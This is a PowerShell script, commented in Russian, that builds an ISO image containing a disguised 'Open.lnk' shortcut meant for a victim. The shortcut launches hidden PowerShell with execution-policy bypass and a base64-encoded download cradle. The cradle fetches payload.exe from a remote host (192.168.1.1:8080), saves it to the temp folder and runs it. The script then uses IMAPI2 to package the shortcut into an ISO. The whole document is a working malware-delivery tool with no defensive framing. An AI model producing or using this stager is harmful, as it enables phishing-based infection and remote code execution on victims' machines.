# ---- Настройки ----
$URL      = "http://192.168.1.1:8080/payload.exe"
$OutFile  = "C:\Temp\archive.iso"
$LnkName  = "Open.lnk"   # имя файла внутри ISO (видит жертва)
$VolName  = "Archive"     # метка тома
# --------------------

# Вспомогательный тип для чтения IStream через COM-interop
Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

public static class IsoHelper {
    public static void WriteStream(object comStream, string path) {
        IStream s = (IStream)comStream;
        using (FileStream fs = new FileStream(path, FileMode.Create, FileAccess.Write)) {
            byte[] buf = new byte[65536];
            IntPtr pRead = Marshal.AllocHGlobal(IntPtr.Size);
            try {
                while (true) {
                    s.Read(buf, buf.Length, pRead);
                    int n = Marshal.ReadInt32(pRead);
                    if (n == 0) break;
                    fs.Write(buf, 0, n);
                }
            } finally { Marshal.FreeHGlobal(pRead); }
        }
    }
}
'@ -EA Stop

# Шаг 1: создаём временный LNK-стейджер
$tmp  = [System.IO.Path]::GetTempPath()
$dir  = Join-Path $tmp ("iso_src_" + [guid]::NewGuid().ToString("N"))
New-Item $dir -ItemType Directory -Force | Out-Null

$lnkPath = Join-Path $dir $LnkName
$cradle  = "iwr '$URL' -outf `$env:TEMP\s.exe -UseBasicParsing; Start-Process `$env:TEMP\s.exe"

$sh  = New-Object -ComObject WScript.Shell
$lnk = $sh.CreateShortcut($lnkPath)
$lnk.TargetPath       = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$lnk.Arguments        = "-nop -w hidden -ep bypass -enc $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cradle)))"
$lnk.IconLocation     = "$env:SystemRoot\System32\shell32.dll, 2"
$lnk.WorkingDirectory = "$env:SystemRoot\System32"
$lnk.Save()

# Шаг 2: собираем ISO через IMAPI2
$fsi = New-Object -ComObject IMAPI2FS.MsftFileSystemImage
$fsi.FileSystemsToCreate = 3      # ISO9660 | Joliet
$fsi.VolumeName          = $VolName
$fsi.Root.AddTree($dir, $false)

$result = $fsi.CreateResultImage()

[IsoHelper]::WriteStream($result.ImageStream, $OutFile)

# Шаг 3: очистка
Remove-Item $dir -Recurse -Force

Write-Host "[+] ISO: $OutFile  ($('{0:N0}' -f (Get-Item $OutFile).Length) bytes)"
